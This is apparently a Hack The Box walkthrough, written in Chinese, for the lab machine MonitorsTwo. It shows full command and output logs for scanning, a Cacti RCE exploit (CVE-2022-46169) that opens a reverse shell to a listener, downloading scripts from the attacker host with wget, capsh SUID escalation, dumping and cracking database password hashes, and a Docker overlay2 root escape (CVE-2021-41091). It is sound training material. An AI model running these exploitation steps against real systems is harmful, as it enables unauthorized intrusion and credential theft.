###### tags: `Hack the box` `HTB` `Easy` `Linux`

# MonitorsTwo
```
┌──(kali㉿kali)-[~/htb]
└─$ rustscan -a 10.129.163.44 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 10.129.163.44:22
Open 10.129.163.44:80

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC82vTuN1hMqiqUfN+Lwih4g8rSJjaMjDQdhfdT8vEQ67urtQIyPszlNtkCDn6MNcBfibD/7Zz4r8lr1iNe/Afk6LJqTt3OWewzS2a1TpCrEbvoileYAl/Feya5PfbZ8mv77+MWEA+kT0pAw1xW9bpkhYCGkJQm9OYdcsEEg1i+kQ/ng3+GaFrGJjxqYaW1LXyXN1f7j9xG2f27rKEZoRO/9HOH9Y+5ru184QQXjW/ir+lEJ7xTwQA5U1GOW1m/AgpHIfI5j9aDfT/r4QMe+au+2yPotnOGBBJBz3ef+fQzj/Cq7OGRR96ZBfJ3i00B/Waw/RI19qd7+ybNXF/gBzptEYXujySQZSu92Dwi23itxJBolE6hpQ2uYVA8VBlF0KXESt3ZJVWSAsU3oguNCXtY7krjqPe6BZRy+lrbeska1bIGPZrqLEgptpKhz14UaOcH9/vpMYFdSKr24aMXvZBDK1GJg50yihZx8I9I367z0my8E89+TnjGFY2QTzxmbmU=
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH2y17GUe6keBxOcBGNkWsliFwTRwUtQB3NXEhTAFLziGDfCgBV7B9Hp6GQMPGQXqMk7nnveA8vUz0D7ug5n04A=
|   256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKfXa+OM5/utlol5mJajysEsV4zb/L0BJ1lKxMPadPvR
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 4F12CCCD3C42A4A478F067337FE92794
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Login to Cacti
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

`ffuf`掃
```
┌──(kali㉿kali)-[~/htb]
└─$ ffuf -u http://10.129.163.44/FUZZ -w /home/kali/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt 

docs                    [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 296ms]
scripts                 [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 296ms]
service                 [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 296ms]
plugins                 [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 296ms]
log                     [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 296ms]
install                 [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 297ms]
lib                     [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 296ms]
resource                [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 297ms]
cache                   [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 303ms]
include                 [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 305ms]
LICENSE                 [Status: 200, Size: 15171, Words: 2581, Lines: 280, Duration: 299ms]
formats                 [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 296ms]
CHANGELOG               [Status: 200, Size: 254887, Words: 32927, Lines: 3625, Duration: 300ms]
cli                     [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 298ms]
locales                 [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 295ms]
                        [Status: 200, Size: 13844, Words: 600, Lines: 273, Duration: 387ms]
mibs                    [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 296ms]
:: Progress: [87664/87664] :: Job [1/1] :: 105 req/sec :: Duration: [0:11:21] :: Errors: 0 ::
```

查看`http://10.129.163.44/CHANGELOG`，可以發現`Cacti`版本`1.2.22`
```
Cacti CHANGELOG

1.2.22
```

google可以找到[CVE-2022-46169](https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22/tree/main)，開nc並使用他
```
┌──(kali㉿kali)-[~/htb]
└─$ rlwrap -cAr nc -nvlp4444

┌──(kali㉿kali)-[~/htb/CVE-2022-46169-CACTI-1.2.22]
└─$ python3 CVE-2022-46169.py -u http://10.129.243.227/ --LHOST=10.10.14.36 --LPORT=4444

www-data@50bca5e748b0:/var/www/html$
```

想直接用`linpeas.sh`，可以知道是`docker`環境，再發現`/sbin/capsh`是root權限，查看[GTFOBins](https://gtfobins.github.io/gtfobins/capsh/#suid)可以看到可以更改權限為root
```
┌──(kali㉿kali)-[~/htb]
└─$ python3 -m http.server 80

www-data@50bca5e748b0:/tmp$ wget 10.10.14.36/linpeas.sh
www-data@50bca5e748b0:/tmp$ chmod +x linpeas.sh
www-data@50bca5e748b0:/tmp$ ./linpeas.sh

╔══════════╣ Container & breakout enumeration
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout                                                
═╣ Container ID ................... 50bca5e748b0═╣ Container Full ID .............. 50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e
═╣ Seccomp enabled? ............... enabled
═╣ AppArmor profile? .............. docker-default (enforce)
═╣ User proc namespace? ........... enabled         0          0 4294967295
═╣ Vulnerable to CVE-2019-5021 .... No

══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                                                
                      ╚════════════════════════════════════╝                                                                      
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                  
strace Not Found                                                                                                                  
-rwsr-xr-x 1 root root 87K Feb  7  2020 /usr/bin/gpasswd                                                                          
-rwsr-xr-x 1 root root 63K Feb  7  2020 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                                                                                                              
-rwsr-xr-x 1 root root 52K Feb  7  2020 /usr/bin/chsh
-rwsr-xr-x 1 root root 58K Feb  7  2020 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 44K Feb  7  2020 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 31K Oct 14  2020 /sbin/capsh


╔══════════╣ Unexpected in root
/.dockerenv                                                                                                                       
/entrypoint.sh
```

查看`/entrypoint.sh`
```bash
www-data@50bca5e748b0:/var/www/html$ cat /entrypoint.sh

#!/bin/bash
set -ex

wait-for-it db:3306 -t 300 -- echo "database is connected"
if [[ ! $(mysql --host=db --user=root --password=root cacti -e "show tables") =~ "automation_devices" ]]; then
    mysql --host=db --user=root --password=root cacti < /var/www/html/cacti.sql
    mysql --host=db --user=root --password=root cacti -e "UPDATE user_auth SET must_change_password='' WHERE username = 'admin'"
    mysql --host=db --user=root --password=root cacti -e "SET GLOBAL time_zone = 'UTC'"
fi

chown www-data:www-data -R /var/www/html
# first arg is `-f` or `--some-option`
if [ "${1#-}" != "$1" ]; then
        set -- apache2-foreground "$@"
fi

exec "$@"
```

用用看
```
www-data@50bca5e748b0:/var/www/html$ mysql --host=db --user=root --password=root cacti -e "show tables"
< --user=root --password=root cacti -e "show tables"
Tables_in_cacti
aggregate_graph_templates
aggregate_graph_templates_graph
aggregate_graph_templates_item
aggregate_graphs
aggregate_graphs_graph_item
aggregate_graphs_items
automation_devices
automation_graph_rule_items
automation_graph_rules
automation_ips
automation_match_rule_items
automation_networks
automation_processes
automation_snmp
automation_snmp_items
automation_templates
automation_tree_rule_items
automation_tree_rules
cdef
cdef_items
color_template_items
color_templates
colors
data_debug
data_input
data_input_data
data_input_fields
data_local
data_source_profiles
data_source_profiles_cf
data_source_profiles_rra
data_source_purge_action
data_source_purge_temp
data_source_stats_daily
data_source_stats_hourly
data_source_stats_hourly_cache
data_source_stats_hourly_last
data_source_stats_monthly
data_source_stats_weekly
data_source_stats_yearly
data_template
data_template_data
data_template_rrd
external_links
graph_local
graph_template_input
graph_template_input_defs
graph_templates
graph_templates_gprint
graph_templates_graph
graph_templates_item
graph_tree
graph_tree_items
host
host_graph
host_snmp_cache
host_snmp_query
host_template
host_template_graph
host_template_snmp_query
plugin_config
plugin_db_changes
plugin_hooks
plugin_realms
poller
poller_command
poller_data_template_field_mappings
poller_item
poller_output
poller_output_boost
poller_output_boost_local_data_ids
poller_output_boost_processes
poller_output_realtime
poller_reindex
poller_resource_cache
poller_time
processes
reports
reports_items
sessions
settings
settings_tree
settings_user
settings_user_group
sites
snmp_query
snmp_query_graph
snmp_query_graph_rrd
snmp_query_graph_rrd_sv
snmp_query_graph_sv
snmpagent_cache
snmpagent_cache_notifications
snmpagent_cache_textual_conventions
snmpagent_managers
snmpagent_managers_notifications
snmpagent_mibs
snmpagent_notifications_log
user_auth
user_auth_cache
user_auth_group
user_auth_group_members
user_auth_group_perms
user_auth_group_realm
user_auth_perms
user_auth_realm
user_domains
user_domains_ldap
user_log
vdef
vdef_items
version
```

查看`user_auth`，有一個`marcus`的hash`$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C`
```
www-data@50bca5e748b0:/var/www/html$ mysql --host=db --user=root --password=root cacti -e "select * from user_auth"
< --password=root cacti -e "select * from user_auth"
id      username        password        realm   full_name       email_address   must_change_password    password_change show_treeshow_list        show_preview    graph_settings  login_opts      policy_graphs   policy_trees    policy_hosts    policy_graph_templates    enabled lastchange      lastlogin       password_history        locked  failed_attempts lastfail        reset_perms
1       admin   $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC    0       Jamie Thompson  admin@monitorstwo.htb    on       on      on      on      on      2       1       1       1       1       on      -1      -1      -1              0       0663348655
3       guest   43e9a4ab75570f5b        0       Guest Account           on      on      on      on      on      3       1       111       1               -1      -1      -1              0       0       0
4       marcus  $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C    0       Marcus Brune    marcus@monitorstwo.htb   on       on      on      on      1       1       1       1       1       on      -1      -1              on      0       0       2135691668
```

john破解
```
┌──(kali㉿kali)-[~/htb]
└─$ john marcus_hash --wordlist=/home/kali/rockyou.txt 

funkymonkey      (?) 
```

ssh登入，可在`/home/marcus`得user.txt
```
┌──(kali㉿kali)-[~/htb]
└─$ ssh marcus@10.129.243.227

Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.243.227' (ED25519) to the list of known hosts.
marcus@10.129.243.227's password: funkymonkey

marcus@monitorstwo:~$ cat user.txt
125054a084a8dd6cefd4058730190e79
```

一樣使用`linpeas`
```
marcus@monitorstwo:/tmp$ wget 10.10.14.36/linpeas.sh
marcus@monitorstwo:/tmp$ chmod a+r+x+w linpeas.sh 
marcus@monitorstwo:/tmp$ ./linpeas.sh

╔══════════╣ Mails (limit 50)
     4721      4 -rw-r--r--   1 root     mail         1809 Oct 18  2021 /var/mail/marcus                                                    
     4721      4 -rw-r--r--   1 root     mail         1809 Oct 18  2021 /var/spool/mail/marcus
```

查看`/var/mail/marcus`裡面有提到docker的漏洞`CVE-2021-41091`
```
marcus@monitorstwo:~$ cat /var/mail/marcus 
From: administrator@monitorstwo.htb
To: all@monitorstwo.htb
Subject: Security Bulletin - Three Vulnerabilities to be Aware Of

Dear all,

We would like to bring to your attention three vulnerabilities that have been recently discovered and should be addressed as soon as possible.

CVE-2021-33033: This vulnerability affects the Linux kernel before 5.11.14 and is related to the CIPSO and CALIPSO refcounting for the DOI definitions. Attackers can exploit this use-after-free issue to write arbitrary values. Please update your kernel to version 5.11.14 or later to address this vulnerability.

CVE-2020-25706: This cross-site scripting (XSS) vulnerability affects Cacti 1.2.13 and occurs due to improper escaping of error messages during template import previews in the xml_path field. This could allow an attacker to inject malicious code into the webpage, potentially resulting in the theft of sensitive data or session hijacking. Please upgrade to Cacti version 1.2.14 or later to address this vulnerability.

CVE-2021-41091: This vulnerability affects Moby, an open-source project created by Docker for software containerization. Attackers could exploit this vulnerability by traversing directory contents and executing programs on the data directory with insufficiently restricted permissions. The bug has been fixed in Moby (Docker Engine) version 20.10.9, and users should update to this version as soon as possible. Please note that running containers should be stopped and restarted for the permissions to be fixed.

We encourage you to take the necessary steps to address these vulnerabilities promptly to avoid any potential security breaches. If you have any questions or concerns, please do not hesitate to contact our IT department.

Best regards,

Administrator
CISO
Monitor Two
Security Team
```

想到剛剛的`docker`查看版本`20.10.5+dfsg1`，可以找到[CVE-2021-41091](https://github.com/UncleJ4ck/CVE-2021-41091)
```
marcus@monitorstwo:/tmp$ docker version 
Client:
 Version:           20.10.5+dfsg1
 API version:       1.41
 Go version:        go1.15.9
 Git commit:        55c4c88
 Built:             Wed Aug  4 19:55:57 2021
 OS/Arch:           linux/amd64
 Context:           default
 Experimental:      true
Got permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get "http://%2Fvar%2Frun%2Fdocker.sock/v1.24/version": dial unix /var/run/docker.sock: connect: permission denied
```

照著上面先把`container`裡面設為`root`權限
```
www-data@50bca5e748b0:/var/www/html$ /sbin/capsh --gid=0 --uid=0 --

/sbin/capsh --gid=0 --uid=0 --
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
chmod u+s /bin/bash
ls -ls /bin/bash
1208 -rwsr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
```

確認OK把`exp.sh`傳到靶機上，並照著步驟執行後可以得到root後，在`/root`可得root.txt
```
marcus@monitorstwo:~$ wget 10.10.14.36/exp.sh
marcus@monitorstwo:~$ chmod +x exp.sh
marcus@monitorstwo:~$ ./exp.sh

marcus@monitorstwo:/tmp$ ./exp.sh
[!] Vulnerable to CVE-2021-41091
[!] Now connect to your Docker container that is accessible and obtain root access !
[>] After gaining root access execute this command (chmod u+s /bin/bash)

Did you correctly set the setuid bit on /bin/bash in the Docker container? (yes/no): yes
[!] Available Overlay2 Filesystems:
/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged

[!] Iterating over the available Overlay2 filesystems !
[?] Checking path: /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
[x] Could not get root access in '/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged'

[?] Checking path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
[!] Rooted !
[>] Current Vulnerable Path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
[?] If it didn't spawn a shell go to this path and execute './bin/bash -p'

[!] Spawning Shell
bash-5.1# exit
marcus@monitorstwo:/tmp$ cd /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged$ ./bin/bash -p
bash-5.1# whoami
root
bash-5.1# cd /root
bash-5.1# ls
cacti  root.txt
bash-5.1# cat root.txt
5c00b75f2de4d33298337fd3442fcbd8
```
